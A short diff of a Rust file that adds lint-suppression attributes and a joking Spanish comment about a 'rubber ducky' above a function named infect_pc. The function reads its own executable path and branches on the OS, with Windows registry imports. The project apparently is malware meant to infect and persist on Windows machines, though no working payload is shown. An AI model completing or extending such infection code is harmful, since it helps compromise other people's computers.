@@ -7,8 +7,11 @@ use std::path::{Path, PathBuf};
 use winreg::enums::*;
 #[cfg(target_os = "windows")]
 use winreg::RegKey;
-
+// creo que esto lo deberia de hacer el rubber ducky XD
+#[allow(unused_variables)]
+#[allow(dead_code)]
 fn infect_pc() {
+
     let current_path: PathBuf = current_exe().unwrap();
     match OS {
         "windows" =>{
